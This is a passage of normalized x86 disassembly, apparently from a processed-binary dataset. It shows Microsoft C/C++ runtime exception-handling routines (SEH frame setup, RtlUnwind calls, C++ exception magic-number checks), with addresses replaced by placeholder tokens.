and [ ecx + 0x70 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax edx
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_41a962
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push [ ebp + 0x10 ]
call sub_411f0f
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov eax ebx
sar eax 0x8
mov [ ebp + 0x8 ] eax
lea ecx [ ebp - 0x18 ]
movzx eax al
push ecx
push eax
call sub_41742d
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_41866f
add esp 0x1c
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41aa11
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_41aa3b
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_41aabb
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_414594
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40f691
pop ecx
sub_41aada
push ebp
mov ebp esp
sub esp 0x10
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_414556
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_41465e
int3
sub_41ab0b
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_414531
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_41465e
int3
sub_41ab39
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_414531
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_41465e
int3
sub_41ab74
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_41abaa
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40f682
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_41bc22
add esp 0x20
pop esi
pop ebp
retn
sub_41abdb
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40f682
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_41bc22
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_41acdd
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41ae61
pop ebx
leave
retn
sub_41ac78
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_41abaa
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_41af90
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_41acdd
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x34 ] sub_41abdb
mov eax [ rw-data ]
lea ecx [ ebp - 0x38 ]
xor eax ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x18 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
call sub_414adf
mov eax [ eax + 0x80 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x8 ]
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x38 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
sub_41adb2
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
mov ecx [ eax + 0x10 ]
push esi
mov esi [ eax + 0xc ]
push edi
mov [ ebp - 0x8 ] ecx
mov edi esi
mov [ ebp - 0x4 ] esi
test ebx ebx
js r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] edi
mov eax [ ebp + 0x8 ]
cmp edi [ eax + 0xc ]
ja r-xdata
mov edx [ ebp + 0x10 ]
call sub_415980
cmp esi edi
jbe r-xdata
dec esi
mov eax esi
imul eax eax 0x14
cmp [ eax + ecx + 0x4 ] edx
jge r-xdata
call sub_415980
imul esi esi 0x14
pop edi
lea eax [ ecx + esi ]
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp edx [ eax + ecx + 0x8 ]
jle r-xdata
test ebx ebx
jns r-xdata
mov edi [ ebp - 0x4 ]
dec ebx
mov [ ebp - 0x4 ] esi
cmp esi 0xffffffff
jne r-xdata
sub_41ae31
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_41ae61
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call [ RtlUnwind@IAT ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_41aeb4
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
call sub_414adf
mov ecx [ eax + 0x98 ]
mov [ esi + 0x4 ] ecx
call sub_414adf
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_41aede
push ebp
mov ebp esp
push esi
call sub_414adf
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_414adf
mov ecx [ eax + 0x98 ]
jmp r-xdata
call sub_414adf
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebp
jmp sub_415980
mov eax [ esi + 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx eax
pop esi
pop ebp
retn
sub_41af2e
push ebp
mov ebp esp
call sub_414adf
mov eax [ eax + 0x98 ]
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_41af57
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41bc22
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41af90
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_41701c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_41701c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_41afdc
push 0x8
push r--data
call sub_411a70
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_411ab5
retn
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
push edx
push [ eax + 0x18 ]
call sub_41acd6
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
sub_41b08d
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_414594
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40f691
pop ecx
sub_41b0b2
push 0x30
push r--data
call sub_411a70
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov edi [ ebp + 0xc ]
mov eax [ edi - 0x4 ]
mov [ ebp - 0x28 ] eax
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
lea eax [ ebp - 0x40 ]
push eax
call sub_41aeb4
pop ecx
pop ecx
mov [ ebp - 0x2c ] eax
call sub_414adf
mov eax [ eax + 0x88 ]
mov [ ebp - 0x30 ] eax
call sub_414adf
mov eax [ eax + 0x8c ]
mov [ ebp - 0x34 ] eax
call sub_414adf
mov [ eax + 0x88 ] esi
call sub_414adf
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
mov [ ebp - 0x4 ] ebx
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_41ac78
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41b201
mov eax edi
call sub_411ab5
retn
sub_41b151
mov esp [ ebp - 0x18 ]
call sub_414adf
xor ebx ebx
mov [ eax + 0x3ac ] ebx
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ edx + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push edx
push ebx
push edi
call sub_41bb49
add esp 0x10
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_41b201
mov eax edi
call sub_411ab5
retn
mov esi eax
imul esi esi 0x14
mov edi [ edx + 0x10 ]
cmp ecx [ esi + edi + 0x4 ]
mov edi [ ebp + 0xc ]
jle r-xdata
mov [ ebp - 0x20 ] ecx
mov eax [ edx + 0x10 ]
mov [ ebp + 0x18 ] eax
mov eax ebx
mov [ ebp - 0x24 ] eax
cmp [ edx + 0xc ] eax
jbe r-xdata
inc eax
mov [ ebp - 0x24 ] eax
cmp eax [ edx + 0xc ]
jb r-xdata
mov edx [ ebp + 0x18 ]
cmp ecx [ esi + edx + 0x8 ]
mov edx [ ebp + 0x14 ]
jg r-xdata
imul eax eax 0x14
mov ecx [ edx + 0x10 ]
mov eax [ eax + ecx + 0x4 ]
inc eax
mov [ ebp - 0x20 ] eax
mov ecx [ edx + 0x8 ]
mov ecx [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
sub_41b201
mov eax [ ebp - 0x28 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x2c ]
call sub_41aede
pop ecx
call sub_414adf
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x88 ] ecx
call sub_414adf
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov edi [ ebp - 0x1c ]
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
retn
test edi edi
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_41af2e
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_41afdc
pop ecx
pop ecx
jmp r-xdata
sub_41b2c0
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push edi
push [ ebp + 0x8 ]
call sub_41b8e8
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop ebp
retn
push edi
push eax
call sub_41ae31
call sub_41ae61
push esi
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_41bb49
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
push [ eax + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_41b0b2
add esp 0x2c
pop esi
test eax eax
je r-xdata
sub_41b33b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_414adf
xor ecx ecx
inc ecx
mov [ eax + 0x3ac ] ecx
mov eax ecx
pop ebp
retn
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_41b388
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
xor ebx ebx
cmp [ edi + 0x4 ] 0x80
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x1 ] bl
jg r-xdata
mov eax [ eax + 0x8 ]
movsx eax [ eax + 0x8 ]
jmp r-xdata
call sub_415980
cmp eax [ edi + 0x4 ]
jl r-xdata
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0xe06d7363
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_414adf
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ ebp + 0x1c ] bl
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_415980
call sub_4159b8
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push esi
call sub_41b723
add esp 0x20
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_414adf
cmp [ eax + 0x88 ] ebx
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
call sub_414adf
mov esi [ eax + 0x88 ]
call sub_414adf
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x24 ] 0x1
call sub_41bd5e
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ edi + 0xc ] ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_415980
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_41adb2
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x28 ]
jae r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
call sub_414adf
cmp [ eax + 0x94 ] ebx
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_41afdc
pop ecx
pop ecx
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
call sub_414adf
mov eax [ eax + 0x94 ]
mov [ ebp - 0x14 ] eax
call sub_414adf
push [ ebp - 0x14 ]
mov [ eax + 0x94 ] ebx
push esi
call sub_41b83d
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc ecx
add edx 0x14
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
cmp ecx [ ebp - 0x28 ]
jb r-xdata
cmp eax [ edx - 0xc ]
jg r-xdata
mov edi [ ebp - 0x14 ]
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
lea ebx [ edx - 0x10 ]
mov [ ebp - 0x2c ] ebx
mov ebx [ ebp + 0xc ]
cmp [ edx - 0x10 ] eax
jg r-xdata
xor ebx ebx
mov edi [ edx ]
mov [ ebp - 0xc ] edi
mov edi [ edx - 0x4 ]
mov [ ebp - 0x20 ] edi
test edi edi
mov edi [ ebp + 0x18 ]
jle r-xdata
mov eax ebx
mov [ ebp + 0x18 ] ebx
call sub_415980
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ edi + 0x1c ]
push esi
call sub_41b83d
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
push 0x1
push esi
call sub_41afdc
pop ecx
pop ecx
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp - 0x3c ]
mov [ ebp + 0x18 ] r--data
call sub_414531
push r--data
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x3c ] r--data
call sub_41465e
mov eax [ ebp + 0x18 ]
inc ebx
add eax 0x10
mov [ ebp + 0x18 ] eax
cmp ebx [ edi ]
jl r-xdata
call sub_414adf
call sub_414adf
call sub_414adf
mov [ eax + 0x88 ] esi
call sub_414adf
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] edx
test eax eax
jg r-xdata
mov ecx [ edi + 0x4 ]
push rw-data
mov ecx [ eax + ecx + 0x4 ]
call sub_41088e
test al al
jne r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0x1c ]
mov eax [ edx ]
push eax
push ecx
mov [ ebp - 0x30 ] eax
call sub_41bd01
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x20 ]
dec eax
add ecx 0x10
mov [ ebp - 0x20 ] eax
mov [ ebp - 0xc ] ecx
test eax eax
jg r-xdata
call sub_41ae61
push 0xffffffff
push edi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_41bb49
add esp 0x10
push [ edi + 0x1c ]
call sub_41b280
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x30 ]
push [ ebp - 0xc ]
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
push ebx
push esi
call sub_41b2c0
add esp 0x2c
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
dec eax
add edx 0x4
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
sub_41b723
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x80000003
je r-xdata
pop edi
leave
retn
push ebx
push esi
call sub_414adf
cmp [ eax + 0x80 ] 0x0
mov ebx [ ebp + 0x18 ]
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
call sub_414adf
cmp [ eax + 0x80 ] esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push ebx
call sub_41adb2
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
add esp 0x14
cmp ecx edx
jae r-xdata
call sub_415980
cmp [ edi ] 0xe0434f4d
je r-xdata
pop esi
pop ebx
lea esi [ eax + 0xc ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] 0xe0434352
je r-xdata
inc ecx
add esi 0x14
mov [ ebp - 0x8 ] ecx
cmp ecx edx
jb r-xdata
cmp eax [ esi - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_41acdd
add esp 0x1c
test eax eax
jne r-xdata
cmp eax [ esi - 0xc ]
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
shl eax 0x4
mov edi [ edi + eax - 0xc ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
add edi 0xfffffff0
add eax edi
mov edi [ ebp + 0x8 ]
test [ eax ] 0x40
jne r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ edx + eax - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0x8 ] 0x0
mov ebx [ ebp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
push 0x1
push [ ebp + 0x24 ]
lea ecx [ esi - 0xc ]
push [ ebp + 0x20 ]
push ecx
push 0x0
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_41b2c0
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
add esp 0x2c
sub_41b83d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
call sub_415980
xor ebx ebx
mov edi ebx
cmp [ esi ] ebx
jle r-xdata
pop edi
pop esi
mov al bl
pop ebx
leave
retn
mov ecx ebx
mov [ ebp + 0xc ] ebx
inc edi
add ecx 0x10
mov [ ebp + 0xc ] ecx
cmp edi [ esi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
mov eax [ esi + 0x4 ]
push [ edx ]
add eax ecx
push eax
call sub_41bd01
mov ecx [ ebp + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
test eax eax
jle r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
dec eax
add edx 0x4
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edx
test eax eax
jg r-xdata
jmp r-xdata
sub_41b8c3
push ebp
mov ebp esp
